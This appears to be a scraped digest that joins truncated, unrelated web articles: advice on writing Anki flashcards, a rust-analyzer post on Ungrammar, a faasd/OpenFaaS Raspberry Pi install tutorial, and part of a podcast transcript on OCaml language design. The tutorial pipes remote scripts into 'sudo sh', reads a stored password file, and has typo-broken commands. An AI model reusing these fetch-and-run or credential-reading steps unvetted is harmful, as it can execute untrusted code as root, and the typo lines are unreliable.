<li><a href="https://www.supermemo.com/en/archives1990-2015/articles/20rules">The Twenty Rules of Formulating Knowledge in Learning</a> – the creator of the spaced-repetition system SuperMemo discusses how to formulate knowledge so that it sticks. Again, even if you don’t use spaced repetition, definitely read this; the advice is absolutely foundational to my understanding of how to learn. A nontrivial amount of this very blog post is essentially specialising some of these rules to the case of maths and computer science.</li>
<li><a href="https://www.reddit.com/r/medicalschoolanki/">Reddit: Medical School Anki</a>, a subreddit with almost 55,000 subscribers at the time of writing. This link is here just to demonstrate that there are fields (such as medicine) in which Anki is very popular and nowhere near as niche as it is in most areas.</li>
</ul>

<p>Absolutely crucial to the effective use of Anki for even a moderate collection of cards is that answering a card should be a single mental motion.</p>
<p>What does this mean? We’ll demonstrate with some positive and negative examples.</p>
<ul>
<li>“What is the capital of France?” is probably answered with a single mental motion: it’s just “Paris”, obtained by a simple lookup in your memory.</li>
<li>“What is 367 times 399?” is many mental motions unless you are really unusually good at mental arithmetic. Almost everyone has to carry out some algorithm to get an answer to this question.</li>
<li>“What is the composition of air?” is probably many mental motions: for example, a lookup of “which gases are in air?” and a number of motions like “what proportion of air is this specific gas?”. Or it could be the various mental motions of “Which gas is the nth most common in air, and what is its proportion in air?” as n varies.</li>
<li>“What is the most common gas in air, and what is its proportion?” is very possibly a single mental motion despite the multiple components in its answer. For me, the knowledge that “nitrogen is the most common gas in air” is intimately bound up with “78% of air is nitrogen”; to answer one question is to access the same mental lump of storage as is required to answer the other question. Of course, for someone else, this may be two distinct facts and two distinct memory lookups.</li>
</ul>
<p>A card that is answered with one mental motion may be multiple motions for someone else; and a question answered with many mental motions may become one motion after you learn some additional fact or part of the model that ties the facts together. So it’s helpful if you personally keep track of what you’re doing to answer a given card, so that you can recognise some of this structure in your own mind.</p>
<p>Any card which is multiple mental motions should be broken down into smaller chunks.</p>
<p>If you’re doing too much work to answer a card, it’s important to notice, so that you can break the card down. And don’t worry that you might “break down a card too much”; if the cards are easy, Anki will exponentially decrease how often it shows them to you. The cost of creating a card that’s too easy is almost entirely in the time it takes you to create the card in the first place; a card that’s too difficult will sap your time and energy again and again.</p>

<p>As an example, recall the <a href="https://en.wikipedia.org/wiki/Ratio_test">ratio test for convergence</a>, likely to be covered in any first course in analysis:</p>
<p><em>Let$\sum_{n=1}^{\infty} a_n$ be a complex series, with each $a_i$ nonzero.<br>
Suppose that there is $a$ such that $|\frac{a_{n+1}}{a_n}| \to a$.<br>
Then, if $a &lt; 1$ then the series converges absolutely; if $a &gt; 1$ then the series diverges.</em></p>
<p>(We’ll discuss its proof in a later section.)</p>
<p>This statement has a number of moving parts, and is definitely much too large to appear as a single card. (Remember the rule of thumb: answering a single card should be a single mental motion.)<br>
How could we formulate this statement in an Anki-friendly way?</p>
<p>My own personal Anki collection contains the following cards. (Anki does allow LaTeX, though I often optimise for speed of card creation and just use plain text, however ugly it ends up. As long as it’s easily legible, it doesn’t need to be pretty.)</p>
<ul>
<li>What conditions exist on the ratio test? (answer: nonzero, sequence of ratios has a limit)</li>
<li>When does the ratio test let us conclude something? (answer: successive ratios converge to something not equal to 1)</li>
<li>Which cases exist on the ratio test? (answer: ratios converge to less than, or greater than, 1)</li>
<li>What can we say from the ratio test if the ratios converge to something less than 1? (answer: converges absolutely)</li>
<li>What can we say from the ratio test if the ratios converge to something greater than 1? (answer: diverges)</li>
<li>What can we say from the ratio test if the ratios converge to 1? (answer: nothing)</li>
<li>Give an example where the ratio test is inconclusive. (answer: <a href="https://en.wikipedia.org/wiki/Harmonic_series_(mathematics)">harmonic series</a>)</li>
</ul>
<p>All these cards are very simple; perhaps they might look laughably simple. This is fine! Remember that Anki will rapidly stop showing you cards you already know. Crucially each card is really a single mental motion to answer.</p>
<p>Note also that information is duplicated between cards. For example, there are two cards saying in slightly different ways that the ratio test talks about when successive ratios converge to something not equal to 1. Again, it’s fine to repeat information, because cards are cheap. Here, the information is duplicated to better facilitate the links between the cards: one card is a general “when can we conclude anything”, and one card is the same information rephrased as “which cases do I need to consider to produce more information here”. Without the additional rephrasing, there’s more of a risk of developing “isolated” clusters of cards; the aim is that given just the prompt “ratio test”, I can reproduce the <em>entire</em> cluster without thinking any further.</p>
<p>And don’t forget to store key examples and counterexamples!</p>

<p>Remembering a definition is rather like remembering the statement of a theorem.<br>
Without further ado, here is my definition of a <a href="https://en.wikipedia.org/wiki/Red-black_tree">red-black tree</a>:</p>
<ul>
<li>What, imprecisely, are the colouring rules on a red-black tree? (“global; local; base-case”)</li>
<li>What are the leaves of a red-black tree? (“null, black”)</li>
<li>What is the base-case colouring rule of a red-black tree? (“leaves are black”)</li>
<li>What is the local colouring rule of a red-black tree? (“red node =&gt; black children”)</li>
<li>What is the global colouring rule of a red-black tree? (“black depth is well defined”)</li>
<li>What is the black depth of a node in a red-black tree? (“the number of black nodes encountered on a path from that node down to a leaf”)</li>
</ul>
<p>Again, there is some duplication (two cards note that the leaves of a red-black tree are coloured black), and all the cards are extremely simple. The point is to make sure not only that the actual <em>content</em> is remembered, but also that the content is interlinked enough that you can reproduce the entire definition from the single prompt “red-black tree”. Moreover, one card is explicitly structural and carries no actual content as such: the card that lists the three types of colouring rule. This card is there solely to allow me to remember which <em>cards</em> are relevant.</p>
<p>Naively, one might create instead a single card, “what is a red-black tree?”. But in my experience, this is too big. If you’re reviewing even 30 cards a day, and …</p></div></div></div>

<br/>
October 24, 2020 | https://rust-analyzer.github.io//blog/2020/10/24/introducing-ungrammar.html | <a href="https://web.archive.org/web/*/https://rust-analyzer.github.io//blog/2020/10/24/introducing-ungrammar.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>So, what exactly does “describing syntax trees” mean and why is it useful?
When writing an IDE, one of the core data structure is the concrete syntax tree.
It is a full-fidelity tree which represents the original source code in detail, including parenthesis, comments, and whitespace.
CSTs are used for initial analysis of the language.
They are also a vocabulary type for refactors.
Although the ultimate result of a refactor is a text diff, tree modification is a more convenient internal representation.</p>

<p>At the lowest level, the CST is typically unityped: there’s some <code>Node</code> superclass, which has a collection of <code>Node</code> children and an optional <code>Node</code> parent.
On top of this raw layer, a more AST-like API is provided: <code>Struct</code> has a <code>.name()</code> and a list of <code>.fields()</code>, etc.
This typed API is huge!
For rust-analyzer, it is comprised of more than 130 <em>types</em>!
And it is also more detailed than a typical AST: <code>Struct</code> also has <code>.l_curly()</code> and <code>.r_curly()</code>.</p>
<p>What’s worse, this API changes a lot, especially at the beginning.
You may start with nesting <code>.fields()</code> directly under the <code>Struct</code>, but then introduce a <code>StructFields</code> node for everything between the curly braces to share the code with enum variants.</p>
<p>In short, writing this by hand sucks :-)
Ungrammar is a notation to concisely describe the structure of the syntax tree, which can be used by a code generator to build an API in the target language.
If you’ve heard about <a href="https://www.oilshell.org/blog/2016/12/11.html">ASDL</a>, ungrammar is ASDL for concrete syntax trees.
For rust-analyzer’s case, that means taking the following input:</p>
<div>
<div>
<pre><code><table><tbody><tr><td><pre>1
2
3
4
</pre></td><td><pre>Module =
  Attr* Visibility?
  'mod' Name
  (ItemList | ';')
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>And generating the following output:</p>
<div>
<div>
<pre><code data-lang="rust"><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
</pre></td><td><pre><span>impl</span> <span>ast</span><span>::</span><span>AttrsOwner</span>      <span>for</span> <span>Module</span> <span>{}</span>
<span>impl</span> <span>ast</span><span>::</span><span>VisibilityOwner</span> <span>for</span> <span>Module</span> <span>{}</span>
<span>impl</span> <span>ast</span><span>::</span><span>NameOwner</span>       <span>for</span> <span>Module</span> <span>{}</span>
<span>impl</span> <span>Module</span> <span>{</span>
    <span>pub</span> <span>fn</span> <span>mod_token</span><span>(</span><span>&amp;</span><span>self</span><span>)</span>       <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>SyntaxToken</span><span>&gt;</span> <span>{</span> <span>...</span> <span>}</span>
    <span>pub</span> <span>fn</span> <span>item_list</span><span>(</span><span>&amp;</span><span>self</span><span>)</span>       <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>ItemList</span><span>&gt;</span>    <span>{</span> <span>...</span> <span>}</span>
    <span>pub</span> <span>fn</span> <span>semicolon_token</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>SyntaxToken</span><span>&gt;</span> <span>{</span> <span>...</span> <span>}</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>In typical parser generators, something similar can be achieved by generating <em>both</em> the parser and the syntax tree from the same grammar.
This works to some extent, but has an inherent problem that the shape of the tree you want for the programmatic API, and the shape of the grammar you need to implement the parser are often different.
“Technical” transformations like left-recursion elimination don’t affect the language described by the grammar, but completely change the shape of the parse tree.
In contrast, ungrammar focuses solely on the second task, which radically reduces the complexity of the grammar.
In rust-analyzer, it is paired with a hand-written parser.</p>
<p>Treated as an ordinary (context free) grammar, ungrammar describes a superset of the language.
For example, for programmatic API it might be convenient to treat commas in comma-separate lists as a part of the list element
(rust-analyzer doesn’t do this yet, but it should).
This leads to the following ungrammar, which obviously doesn’t treat commas precisely:</p>
<div>
<div>
<pre><code><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre>FieldList =
  '{' Field* '}'

Field:
  Name ':' Type ','?
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>Similarly, ungrammar defines binary and unary expressions, but doesn’t specify their relative precedence and associativity.</p>
<p>An interesting side-effect is that the resulting grammars turn out to be pretty human readable.
For example, a full production ready Rust grammar takes about 600 short lines:<br></p>

<p>This might be a good fit for reference documentation!</p>

        <section>
            <div><p>Kick the tires with faasd today, for a lightweight serverless experience that doesn't require Kubernetes. Instead it uses containerd and the existing OpenFaaS ecosystem.</p>
<blockquote>
<p>Last updated: 24th October 2020 - upgraded faasd &amp; containerd versions. Added instructions for core components logs such as the gateway.</p>
</blockquote>
<p>You can run <a href="https://github.com/openfaas/faasd">faasd</a> anywhere, even on a <a href="https://www.raspberrypi.org/">Raspberry Pi</a>, but why would you want to do that? faasd offers many of the benefits of containers and <a href="https://github.com/openfaas/faas">OpenFaaS</a>, but without the complexity and operational costs of Kubernetes. <a href="https://github.com/containerd/containerd">containerd</a> is a low-level tool for automating containers, and a <a href="https://landscape.cncf.io/">CNCF project</a>.</p>
<p><img src="https://blog.alexellis.io/content/images/2019/12/ofctr.png" alt="OpenFaaS and containerd logos"></p>
<p>The use-cases for <a href="https://blog.alexellis.io/introducing-functions-as-a-service/">Serverless / FaaS are fairly well-known</a>, but you could use faasd at the edge, in a smart-car, as part of an IoT device, for crunching data before uploading samples to the cloud, for webhook receivers/alerting, bots, webservices, API integrations or even providing your own APIs. Compute is compute, and OpenFaaS with containerd makes it easy to both consume and provide.</p>
<blockquote>
<p>🚀 Support the development of faasd - <a href="https://github.com/sponsors/openfaas">Sponsor OpenFaaS on GitHub</a><br>
⭐️ Star or fork <a href="https://github.com/openfaas/faasd">faasd on GitHub</a></p>
</blockquote>
<h2 id="beforewestart">Before we start</h2>
<p>Use Raspbian Lite (now called RaspiOS) for this tutorial. Do not install Docker on the same Raspberry Pi as it may cause conflicts with networking and the version of containerd we are using.</p>
<p>You should use RPi 2, 3 or 4. If you have only one Raspberry Pi, then you'll be able to deploy pre-built images from the OpenFaaS Function Store, but if you have a second Raspberry Pi, then you can use it to build new functions too.</p>
<p>You can also deploy to a PC or cloud VM:</p>
<ul>
<li><a href="https://www.openfaas.com/blog/faasd-tls-terraform/">Deploy faasd to DigitalOcean with Terraform</a></li>
<li><a href="https://github.com/openfaas/faasd/blob/master/docs/MULTIPASS.md">Deploy faasd to your laptop with Multipass</a></li>
</ul>
<h2 id="installation">Installation</h2>
<p>Installation only takes a few moments, and in the future should be quicker if we can secure binaries for containerd from the upstream project.</p>
<h3 id="getfaascli">Get <code>faas-cli</code></h3>
<p>The <a href="https://github.com/openfaas/faas-cli/">faas-cli</a> can be used to build, deploy, manage, and invoke functions with OpenFaaS. OpenFaaS offers a REST API, asynchronous invocations, authentication, metrics, and a UI out of the box.</p>
<p>Install using the utility script, or alternatively the binaries are also available on the <a href="https://github.com/openfaas/faas-cli/releases">releases page</a>.</p>
<pre><code># Install to local directory
curl -sLfS https://cli.openfaas.com | sh
sudo mv faas-cli to /usr/local/bin

# Or run with sudo to move to /usr/local/bin in one step
curl -sLfS https://cli.openfaas.com | sudo sh
</code></pre>
<p>See also: <a href="https://docs.openfaas.com/">OpenFaaS docs</a></p>
<h3 id="getcontainerd">Get containerd</h3>
<p>Unfortunately the <a href="https://github.com/containerd/containerd">containerd</a> maintainers only provide binaries for <code>x86_64</code> (regular PCs), so we have to install Go and build containerd from source.</p>
<p>We'll install some dependencies that will help us in the tutorial and after installation</p>
<pre><code>sudo apt update \
  &amp;&amp; sudo apt install -qy \
    runc \
    bridge-utils \
    tmux \
    git
</code></pre>
<p>Pick option A or B.</p>
<h4 id="ausemycontainerdarmhfbinariesfast">A) Use my containerd armhf binaries (fast)</h4>
<p>I have compiled binaries for containerd, which you can use if you wish. <a href="https://github.com/alexellis/containerd-armhf/releases">alexellis/containerd/armhf</a>.</p>
<pre><code>curl -sSL https://github.com/alexellis/containerd-arm/releases/download/v1.3.5/containerd-1.3.5-linux-armhf.tar.gz | sudo tar -xvz --strip-components=1 -C /usr/local/bin/
</code></pre>
<h4 id="bbuildyourowncontainerdbinariesslow">B) Build your own containerd binaries (slow)</h4>
<p>Raspbian needs a few additional build-time dependencies for containerd:</p>
<pre><code>sudo apt update \
  &amp;&amp; sudo apt install -qy \
    build-essential \
    libbtrfs-dev \
    libseccomp-dev
</code></pre>
<p>You can use my utility script to build containerd now:</p>
<pre><code>export GOPATH=$HOME/go/
mkdir $GOPATH/src/github.com/openfaas
cd $GOPATH/src/github.com/openfaas
git clone https://github.com/openfaas/faasd

cd cd faasd

./hack/build-containerd-armhf.sh
</code></pre>
<p>This could take a few moments on RPi2 or 3, and is a little quicker on RPi4.</p>
<h3 id="configurecontainerdtostartonboot">Configure containerd to start on boot</h3>
<p>Install a systemd unit file for <code>containerd</code>:</p>
<pre><code>curl -SLfs https://raw.githubusercontent.com/containerd/containerd/v1.3.5/containerd.service | sudo tee /etc/systemd/system/containerd.service

sudo systemctl enable containerd
sudo systemctl start containerd
</code></pre>
<p>Check that <code>containerd</code> started with <code>sudo systemctl status containerd</code>, if not then you may need to <code>unmask</code> it and run the commands again. See <a href="https://blog.ruanbekker.com/blog/2017/12/09/unmask-a-masked-service-in-systemd/">unmasking a service</a>.</p>
<h3 id="installnetworking">Install networking</h3>
<ul>
<li>
<p>Enable the Kernel's bridge module</p>
<pre><code># One-off
sudo modprobe br_netfilter &amp;&amp; \
sudo sysctl net.bridge.bridge-nf-call-iptables=1

# Make it permanent
echo "br_netfilter" | sudo tee -a /etc/modules-load.d/modules.conf

echo "net.bridge.bridge-nf-call-iptables=1" | sudo tee -a /etc/sysctl.conf
</code></pre>
</li>
<li>
<p>Install CNI plugins</p>
<p>Fortunately there are upstream ARM binaries available for the CNI plugins.</p>
<pre><code>sudo mkdir -p /opt/cni/bin

curl -sSL https://github.com/containernetworking/plugins/releases/download/v0.8.5/cni-plugins-linux-arm-v0.8.5.tgz | sudo tar -xz -C /opt/cni/bin
</code></pre>
</li>
<li>
<p>Enable NAT</p>
<p>Enable NAT between the container network and your wider network and the Internet:</p>
<pre><code>sudo /sbin/sysctl -w net.ipv4.conf.all.forwarding=1

echo "net.ipv4.conf.all.forwarding=1" | sudo tee -a /etc/sysctl.conf
</code></pre>
<p>Optional step - if you have Docker running on your system, then disable it and reboot at this point.</p>
<pre><code>sudo systemctl disable docker
sudo systemctl disable docker.sock # or docker.socket - You may also need this step
</code></pre>
<p>Docker's IP address range conflicts with the one chosen by netns, this will be resolved when moving to CNI.</p>
</li>
</ul>
<h3 id="getfaasd">Get <code>faasd</code></h3>
<p>faasd is a Go binary that runs on your system and packages all of OpenFaaS, it's a similar tool to docker-compose.</p>
<p>One of faasd's commands <code>faasd provider</code> runs an OpenFaaS provider which implements the OpenFaaS "CRUD" API for functions.</p>
<p>Clean-up old versions, if required:</p>
<pre><code># Stop systemd services, if you have them
sudo systemctl stop faasd
sudo systemctl stop faasd-provider

# Remove old binaries if you have them
sudo rm -rf /usr/local/bin/faasd
</code></pre>
<p>Download the faasd binary:</p>
<pre><code>sudo curl -sSLf "https://github.com/openfaas/faasd/releases/download/0.9.5/faasd-armhf" \
    --output "/usr/local/bin/faasd" \
    &amp;&amp; sudo chmod a+x "/usr/local/bin/faasd"
</code></pre>
<p>Now run the installation:</p>
<pre><code>export GOPATH=$HOME/go/
mkdir -p $GOPATH/src/github.com/openfaas
cd $GOPATH/src/github.com/openfaas

git clone https://github.com/openfaas/faasd --depth=1

cd faasd

sudo faasd install
</code></pre>
<h2 id="postinstall">Post-install</h2>
<p>The <code>faasd install</code> command creates two systemd unit files which can be used to start/stop <code>faasd</code> and <code>faasd-provider</code>.</p>
<h3 id="checktheinstallation">Check the installation</h3>
<p>Check the services:</p>
<pre><code>sudo systemctl status faasd
sudo systemctl status faasd-provider
</code></pre>
<p>Find logs:</p>
<pre><code>sudo journalctl -u faasd --lines 40
sudo journalctl -u faasd-provider --lines 40
</code></pre>
<p>You'll find your login details for the gateway in <code>/var/lib/faasd/secrets</code>, the user is <code>admin</code> and the password is in <code>/var/lib/faasd/secrets/basic-auth-password</code></p>
<h3 id="checkthelogsfromtheopenfaascoreservices">Check the logs from the OpenFaaS Core Services</h3>
<p>You can access the logs from any of the core services deployed with faasd as follows:</p>
<pre><code>sudo journalctl -t default:gateway --lines 40
sudo journalctl -t default:nats --lines 40
sudo journalctl -t default:queue-worker --lines 40
sudo journalctl -t default:prometheus --lines 40
</code></pre>
<p>For more, see the <code>docker-compose.yaml</code> file in the current directory.</p>
<h3 id="accessopenfaasfromyourlaptop">Access OpenFaaS from your laptop</h3>
<p>faasd deploys OpenFaaS along with its core logic <code>faasd-provider</code>, which uses containerd instead of Kubernetes to start, stop, and manage functions.</p>
<p>The <code>faasd</code> process will proxy any incoming requests on HTTP port 8080 to the OpenFaaS gateway container, you can also find the IP of the container in your <code>hosts</code> file in the <code>faasd</code> directory.</p>
<p>You can also access the built-in Prometheus container by editing <code>docker-compose.yaml</code> to expose its ports, either to 127.0.0.1, or all your network adapters.</p>
<h3 id="deployafunctionfromthestore">Deploy a function from the store</h3>
<p>Obtain your OpenFaaS password. You need to run this command on your Raspberry Pi:</p>
<pre><code>sudo cat /var/lib/faasd/secrets/basic-auth-password
</code></pre>
<p>Log in to the gateway, either on your RPi, or from your own computer.</p>
<pre><code># If connecting remotely
export IP=192.168.0.101
export OPENFAAS_URL=http://$IP:8080
echo $PASSWORD | faas-cli login

# Or on device:

sudo cat /var/lib/faasd/secrets/basic-auth-password | faas-cli login --password-stdin
</code></pre>
<p>Look at what's available in the function store for the armhf platform, then deploy something:</p>
<pre><code>faas-cli store list --platform armhf

# Deploy figlet
faas-cli store deploy --platform armhf figlet

# Find the URLs for the function
faas-cli store inspect figlet

# Create some ASCII

echo "faasd" | faas-cli invoke figlet
</code></pre>
<p>Try a function that can generate an <code>identicon</code> like you may have seen for default avatar logos on GitHub.com</p>
<pre><code>faas-cli store deploy --platform armhf identicon

echo $USER | faas-cli invoke identicon &gt; avatar.png
</code></pre>
<p>Here's an example of the avatar for the user <code>pi</code>:</p>
<p><img src="https://blog.alexellis.io/content/images/2020/01/avatar.png" alt="avatar"></p>
<h3 id="runanasyncfunction">Run an async function</h3>
<p>You can also run your functions in the background or asynchronously.</p>
<p>Create a webhook receiver using a public service such as:</p>
<ul>
<li><a href="https://requestbin.com/">https://requestbin.com/</a></li>
<li><a href="https://postb.in/">https://postb.in/</a></li>
</ul>
<pre><code>faas-cli store deploy --platform armhf nodeinfo

curl -d "verbose" \
  http://127.0.0.1:8080/async-function/nodeinfo \
  --header "X-Callback-Url: https://postb.in/1578562711776-8760500776115"
</code></pre>
<p>You'll be able to refresh your webhook receiver and see the value.</p>
<p><img src="https://blog.alexellis.io/content/images/2020/01/Screenshot-2020-01-09-at-09.41.11.png" alt="Screenshot-2020-01-09-at-09.41.11"></p>
<h3 id="buildanewcontainerimage">Build a new container image</h3>
<p>You'll need a second Raspberry Pi for this step since we do not have <code>docker</code> installed on the device.</p>
<p>There are a couple of workarounds if you don't have a second device: use buildkit per as my post <a href="https://blog.alexellis.io/building-containers-without-docker/">Building containers without Docker</a>. Or build on your PC using <a href="https://github.com/alexellis/multiarch-templates">one of my multi-arch templates</a>.</p>
<p>You can also use one of my prebuilt functions such as <a href="https://github.com/alexellis/2020/">ascii-2020</a>, but you should only run the <code>faas-cli deploy</code> step.</p>
<ul>
<li>
<p>Log into the Raspberry Pi with <code>ssh</code> and install the <code>faas-cli</code> and <code>docker</code>.</p>
<pre><code>curl -sLfS https://cli.openfaas.com | sudo sh
</code></pre>
<pre><code>curl -sLfS https://get.docker.com | sudo sh

sudo usermod -aG docker pi
newgrp
</code></pre>
</li>
<li>
<p>Log into the Docker Hub</p>
<pre><code>docker login
</code></pre>
</li>
<li>
<p>Create a Golang function</p>
<pre><code>export DOCKER_HUB_NAME="alexellis2"

faas-cli template store pull golang-middleware

faas-cli new --lang golang-middleware \
  hello-world \
  --prefix $DOCKER_HUB_NAME
</code></pre>
</li>
<li>
<p>Now build and push the image</p>
<pre><code>faas-cli push -f hello-world.yml
faas-cli deploy -f hello-world.yml
</code></pre>
</li>
</ul>

		<h2 id="000000">00:00:00</h2>

<div><p>Welcome to Signals And Threads, in-depth conversations about every layer of the tech stack from Jane Street. I’m Ron Minsky. </p><p> Today, we’re going to have a conversation about programming language design with Leo White. Leo works in our compilers team here at Jane Street, and he works mostly on what’s called the frontend of the compiler, which means he spends a lot of time thinking about language features and about the type system that supports those language features, and in particular, he does that work in OCaml, which is the programming language we use on a day-to-day basis. </p><p> So, Leo, to get started, I’m curious, can you tell us a little bit about how you got involved in all of this? How you got involved in programming language design, in the first place?</p></div>

<h2 id="0000400">00:00:40.0</h2>

<div><p>I had some interest in programming languages from a young age. I started programming at 11 or something, and then I think I was fairly interested in how these mysterious things were created. The most formative thing I can think of in this regard, is between my first and second years at university, I remember reading Benjamin Pierce’s <a href="https://www.cis.upenn.edu/~bcpierce/tapl/"><em>Types and Programming Languages</em></a>. That really clicked. I just thought that stuff was great and I just really wanted work on it, and explore those ideas. </p><p> So, I think that’s kind of one of the main things that got me into it. I knew I wanted to do some programming language stuff, I started doing a PhD in that area. It was more about compilation than programming language design, and I was working on a source-to-source C compiler, and I was writing that compiler in OCaml, because OCaml had a good library for reading C files, and I already knew Standard ML, because it’s what they teach you in the first year at Cambridge. So, anyways, I was using OCaml to write this compiler, and I realized that there was a language feature that I wanted to have that would make it easier for me to write this C compiler, and since I kind of hated the work I was doing on the C compiler and was not that interested in it, I procrastinated by adding this feature to OCaml instead. And that’s kind of how I got into writing code for the OCaml compiler. So, I was writing, this language feature and went through the process of trying to upstream it, and whilst I was doing that and my PhD was coming to an end, Anil Madhavapeddy was looking around for people to join OCaml Labs, which was this new project to work on the OCaml compiler that Jane Street was kind of funding in Cambridge. So, he was trying to look for people to work on the OCaml compiler and suddenly this Cambridge address shows up with the implementing language features for OCaml and so he thought, well, I should go and see this person. So, he got in touch with me. And that’s kind of how I started working at OCaml Labs as an RA after having finished my PhD.</p></div>

<h2 id="0002195">00:02:19.5</h2>

<p>It’s by the way worth noting that most people have the wisdom to not immediately go and dive into adding features to languages that they’re just starting to use, and in particular, diving into the type system. I think when Anil saw someone who was willing to just going in and add a new type system feature, he was pretty excited.</p>

<h2 id="0002346">00:02:34.6</h2>

<p>Yes. I did not realize at the time that this wasn’t something that you just did. Yes, I was somewhat under-supervised in my PhD and clearly, no one told me that this is a terrible idea, and a bad way to spend your time. So, I just went ahead and did it instead, and I really enjoyed it. I mean, it’s quite a terrible…like, the type system is hard to dive into. I would not recommend doing it without some assistance.</p>

<h2 id="0002568">00:02:56.8</h2>

<p>The thing you mentioned about how you got involved in OCaml, is the thing that’s always worried me a little bit about how languages are designed, which is to say, languages are almost inevitably designed by people who write compilers, and so, they go around and look at the features they would like for writing compilers and go ahead and add them to the language, and I always wondered, like, how much of a bias is this in how our languages are designed?</p>

<h2 id="0003178">00:03:17.8</h2>

<p>I would say, not much of one mostly, because that is probably a fair accusation of OCaml, which is very nice for writing compilers and has all the things you would want for writing a compiler, but that is not true of most languages. Most languages are kind of horrible to write compilers in, so I don’t think it’s applying there.</p>

<h2 id="0003327">00:03:32.7</h2>

<p>So, you got excited about programming language design from reading <em>Types and Programming Languages</em>, which is Benjamin Pierce’s extremely famous book in this area, or at least extremely famous in an extremely narrow group of people, and you’ve been doing it now for quite a while. Some of that work during your PhD. Some at OCaml Labs, and a bunch of it here, in the intermediate time. What do you find exciting about language design? Why do you like it?</p>

<h2 id="0003550">00:03:55.0</h2>

<p>One of the main things I think I like about language design is that it sits at an interesting intersection between some very interesting pure mathematics, especially on the type system design side of things, and a more aesthetic, kind of, design style. A lot of it is about trying to find things that fit within the mathematical constraints, but are also a design that people like aesthetically and enjoy using.</p>

<h2 id="0004166">00:04:16.6</h2>

<p>And this is one of the real challenges of programming language design. It is really not, at its heart, a scientific enterprise, or at least, not at the end. This is a thing you often hear programming language people complain about, is the fact that they can’t do any proper studies, or rather, whether they can or can’t do it, that in practice, that is not how the field is driven.</p>

<h2 id="0004365">00:04:36.5</h2>

<p>Some people do try and do studies in how effective a programming language is, but it kind of hits up against all the things that make it hard to do experiments in the social sciences. It’s just seems like, in principle, you can manage it, but the experiments are just very hard to do, right? What you really need to do is get a load of professional programmers to agree to use all these different languages to solve the same problems for a prolonged period of time, and clearly this isn’t going to happen.</p>

<h2 id="0004566">00:04:56.6</h2>

<p>Yeah, it does seem completely and utterly hopeless to me because, if the things you care about are what you can do in a programming language, with large groups of people, solving hard problems, with significant amounts of time being devoted to it, which seems like, to me, at least, the interesting problem, and I think, a problem that a lot of programming languages are not even motivated by, you just have no hope. Like the kind of experiments people can run in practice, are like, they grab the thing they have at hand, which is usually a collection of sophomores, and then they study the thing that they can, which is something like how easy is it to understand the very first errors they see in their language or like, how well do they do when they try and do stuff in their first few weeks or maybe few months of working at it. And that just doesn’t get at the actual thing you care about when you think about what makes programming effective in the real world.</p>

<h2 id="0005434">00:05:43.4</h2>

<div><p>This kind of genuinely bothers quite a lot of people, I think, who work in programming languages. They really would much prefer that it were a proper science. It’s much better thought of as a kind of intersection between some mathematics and design. </p><p> And those are both things that we know how to study, right? The scientific method is not the only approach to knowledge. With mathematics, you can try to prove useful theorems and interesting properties, and people successfully do research in design disciplines like, my favorite example is really architecture, which I think is a very similar area to programming language design, in that it’s kind of constrained by mathematics. You know, you have to make sure the building stays up and also, is interesting from a design perspective. You know, you want to make buildings that people enjoy being in and looking at, and so on.</p></div>

<h2 id="0006249">00:06:24.9</h2>

<p>And there’s more than just the raw structural things you have to check. When you think about the design of a building, you think about what are transit times, and people do all sorts of studies to try get feels for how effective it is, but in the end, no one thinks that the final way to figure out whether a building is good is to do a randomized control trial, where you’re like, you make four different buildings and you have this, this and this. You have four equivalent businesses that you sit in the four different buildings and you see how it goes. And I think the scale of the economic investment required, I’m not sure if it’s not quite as absurd or a little more absurd to do the programming language equivalent, but it’s up there.</p>

<h2 id="0007013">00:07:01.3</h2>

<p>I think that that’s a better way of looking at programming language design, as a discipline.</p>

<h2 id="0007068">00:07:06.8</h2>

<p>You know, there are two ways of handling design problems. One is, you can solve them in the market, right? You can, you know, go off and have people go and design programming languages and see which are successful, and we have that down. There’s a whole system for doing that. And then there’s an academic equivalent of this, and a lot of the work on OCaml, in particular, happens in a context which includes a lot of academic staff. Do you have a feel for how you would make things like evaluation of papers different than it is now in order to accommodate for this?</p>

<h2 id="0007335">00:07:33.5</h2>

<div><p>I don’t have concrete suggestions. I’ve always wanted to, actually seriously, look into disciplines like architecture and so on, and look at how they, I mean they have journals. They have assessment of things. There must be mechanisms by which they do this, but I’ve never actually sat down and put serious time into seeing what that is. </p><p> I’m kind of more struck by the fact that when you’re at, say ICFP, which is the main functional …</p></div></div></div>
